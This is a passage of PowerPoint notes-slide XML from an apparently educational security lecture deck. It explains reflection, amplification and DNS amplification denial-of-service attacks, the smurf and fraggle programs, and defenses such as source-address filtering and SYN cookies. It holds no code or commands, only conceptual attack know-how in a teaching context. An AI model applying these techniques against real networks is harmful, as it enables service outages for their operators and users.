              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>causes the Web server to read the file from hard disk, store it in memory, convert it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>into a packet stream, and then transmit the packets. This process consumes memory,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>processing, and transmission resources.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>169</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2971951236"/>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92C09C22-81AD-482B-ADA0-8714F2BD4EC2}"/>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8252706C-42C9-4CBA-ACF3-9147070C2ADF}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>170</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34819" name="Rectangle 1026">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3C99917C-AEE2-4C60-8142-D35DC2B4E715}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34820" name="Rectangle 1027">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D527458A-03A1-4121-AC37-81A632A7FDE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Reflection and amplification attacks use network systems functioning normally. The attacker sends a network packet with a spoofed source address to a service running on some network server, which responds to this packet, sending it to the spoofed source address that belongs to the actual attack target. If the attacker sends a number of requests to a number of servers, all with the same spoofed source address, the resulting flood of responses can overwhelm the target’s network link. The fact that normal server systems are being used as intermediaries, and that their handling of the packets is entirely conventional, means these attacks can be easier to deploy, and harder to trace back to the actual attacker. Ideally the attacker would like to use a service that created a larger response packet than the original request. This allows the attacker to convert a lower volume stream of packets from the originating system into a higher volume of packets from the intermediary directed at the target. Common UDP services are often used for this purpose. Another variant of reflection attack uses TCP SYN packets, and exploits the normal 3-way handshake used to establish a TCP connection. Fundamental to the success of reflection attacks is the ability to create source spoofed packets. If filters are in place which block source spoofed packets, then these attacks are simply not possible. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3707681883"/>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0088B741-F33D-4A69-8581-6A489266D5FC}"/>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2F5C71F-80C8-4962-99D4-5B27E02D059E}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>172</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37891" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F78D0768-19E9-442E-85B0-C2284039DEB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37892" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDA8792D-4F29-4491-9672-4471478D4420}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A further variation of the reflector attack establishes a self-contained loop between the intermediary and the target system. Originally the UDP echo service was used for this, if running on both systems. The attacker would send a large UDP packet to the echo service on the intermediary, using a spoofed source address and port for the echo service on the target system. The intermediary would respond with a packet to the echo service on the target. When the target received this, it would reply in turn to the intermediary. This process would continue with the packet being echoed back and forth between these systems, until a packet was discarded or otherwise failed to arrive at its destination. If the attacker kept generating a low volume of the original source spoofed packets, this attack could be sustained for long periods, flooding the link between the intermediary and the target. The echo and chargen services, and other similar diagnostic network services can be used to create such reflection loops. Figure 8.5 illustrates this attack. Whilst very effective if possible, this type of attack is fairly easy to filter for, since the combinations of service ports used should never occur in normal network operation.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2781938887"/>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7A5CF3E2-C059-486E-A5EC-04D6B6BEFC8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>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fld id="{58231776-456A-4B4F-980E-DC5CC4799150}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" sz="1200" smtClean="0"/>
              <a:pPr/>
              <a:t>173</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US" sz="1200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43011" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{301AEE19-E587-4DFC-899E-2B846E0252AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43012" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0311FA21-28C6-4128-9443-219EB277A0E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>Amplification attacks are a variant of reflector attacks and also involve sending a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>packet with a spoofed source address for the target system to intermediaries. They</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>differ in generating multiple response packets for each original packet sent. This can</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>be achieved by directing the original request to the broadcast address for some network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>As a result, all hosts on that network can potentially respond to the request,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>generating a flood of responses as shown in Figure 7.7 . It is only necessary to use</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>a service handled by large numbers of hosts on the intermediate network. A ping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>flood using ICMP echo request packets was a common choice, since this service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>is a fundamental component of TCP/IP implementations and was often allowed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>into networks. The well-known </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>smurf DoS program used this mechanism and was</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>widely popular for some time. Another possibility is to use a suitable UDP service,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>such as the echo service. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>fraggle program implemented this variant. Note that</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>TCP services cannot be used in this type of attack; because they are connection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>oriented, they cannot be directed at a broadcast address. Broadcasts are inherently</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>connectionless.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>The best additional defense against this form of attack is to not allow directed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>broadcasts to be routed into a network from outside. Indeed, this is another longstanding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>security recommendation, unfortunately about as widely implemented as</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>that for blocking spoofed source addresses. If these forms of filtering are in place,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>these attacks cannot succeed. Another defense is to limit network services like echo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>and ping from being accessed from outside an organization. This restricts which</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>services could be used in these attacks, at a cost in ease of analyzing some legitimate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>network problems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>Attackers scan the Internet looking for well-connected networks that do allow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>directed broadcasts and that implement suitable services attackers can reflect off.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" panose="020B0600070205080204" pitchFamily="34" charset="-128"/>
              </a:rPr>
              <a:t>These lists are traded and used to implement such attacks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times"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19338015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2A56F36B-1556-4912-8AFF-08A9FF873E84}"/>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221DD2A7-FE25-4406-B8F3-F948CEAE2B1D}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>174</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40963" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40156EC2-FB09-44C8-831E-284EC46AFF11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40964" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FF615F2C-D95E-43D0-99EC-877A5FC89434}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A further variant of a reflection or amplification attack uses packets directed at a legitimate DNS server as the intermediary system. They gain attack amplification by exploiting the behavior of the DNS protocol to convert a small request into a much larger response. Using the classic DNS protocol, a 60 byte UDP request packet can easily result in a 512 byte UDP response, the maximum traditionally allowed. More recently, the DNS protocol has been extended to allow much larger responses of over 4000 bytes, to support extended DNS features such as IPv6, security, and others. By targeting servers that support the extended DNS protocol, significantly greater amplification can be achieved than with the classic DNS protocol. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In this attack, a selection of suitable DNS servers with good network connections, are chosen. The attacker creates a series of DNS requests containing the spoofed source address of the target system. These are directed at a number of the selected name servers. They respond to these requests, sending the replies to the spoofed source, which appears to them to be the legitimate requesting system. The target is then flooded with their responses. Because of the amplification achieved, the attacker need only generate a moderate flow of packets to cause a larger, amplified flow to flood and overflow the link to the target system. Whilst the intermediate systems will also experience significant loads, by using a number of high capacity, well connected systems, the attacker can ensure they are not overloaded, allowing the attack to proceed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="284246488"/>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05168961-D203-4409-AFEF-B890C58014E1}"/>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69A76AF-2044-442A-9800-BE72FD308340}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>177</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DF00E13-6049-4850-A1A4-3F3EA488E206}"/>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93CB83D7-5B6A-48D3-B564-99A54A74B42C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A critical component of many denial of service attacks, is the use of spoofed source addresses. One of the fundamental, and longest standing, recommendations for defense against these attacks is to limit the ability of systems to send packets with spoofed source addresses, cf. RFC 2827. This filtering needs to be done as close to the source as possible, by routers or gateways knowing the valid address ranges of incoming packets. Typically this is the ISP providing the network connection for an organization or home user. Regrettably, despite this being a well-known recommendation, many ISPs still do not perform this type of filtering. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Any defenses against flooding attacks need to be located back in the Internet cloud, not at a target organization’s boundary router, since this is usually located after the resource being attacked. The filters must be applied to traffic before it leaves the ISP’s network, or even at the point of entry to their network. Some attacks using particular packet types, such as ICMP floods, or UDP floods to diagnostic services, can be throttled by imposing limits on the rate at which these packets will be accepted. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>It is possible to specifically defend against the SYN spoofing attack by using a modified version of the TCP connection handling code. Instead of saving the connection details on the server, critical information about the requested connection is cryptographically encoded in a “cookie” that is sent as the server’s initial sequence number. Typically this technique is only used when the table overflows. Alternatively, the system’s TCP/IP network code can be modified to “selective drop” or “random drop” an entry for an incomplete connection from the TCP connections table when it overflows, allowing a new connection attempt to proceed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
